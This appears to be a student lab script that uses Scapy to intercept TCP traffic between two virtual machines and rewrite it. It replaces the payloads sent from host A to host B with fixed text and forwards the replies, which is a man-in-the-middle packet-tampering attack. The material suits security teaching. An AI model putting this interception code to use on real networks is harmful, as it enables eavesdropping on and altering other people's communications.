from scapy.all import *
VM_A_IP = '10.0.2.5'
VM_B_IP = '10.0.2.6'

import uuid
def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

local_mac=get_mac_address()
def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP \
        and pkt[TCP].payload:
        if pkt[TCP].payload.load!='Zz\n' and pkt[Ether].dst==local_mac:
            print ('A to B',pkt[TCP].payload.load)
            pkt.show()
            # Create a new packet based on the captured one.
            # (1) We need to delete the checksum fields in the IP and TCP headers,
            # because our modification will make them invalid.
            # Scapy will recalculate them for us if these fields are missing.
            # (2) We also delete the original TCP payload.
            #Ether=Ether(src=local_mac,dst=pkt[Ether].dst)
            newpkt = IP(pkt[IP])
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            del(newpkt[TCP].payload)

            #####################################################################
            # Construct the new payload based on the old payload.
            # Students need to implement this part.
            olddata = pkt[TCP].payload.load # Get the original payload data

            newdata = 'Zz\n' # No change is made in this sample code
            #####################################################################
            # Attach the new data and set the packet out
            send(newpkt/newdata)
            c=newpkt/newdata
            c.show()
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        if pkt[Ether].dst==local_mac:
            print ('B to A',pkt[TCP].payload)
            pkt.show()
            send(pkt[IP]) # Forward the original packet
pkt = sniff(filter='tcp',prn=spoof_pkt)
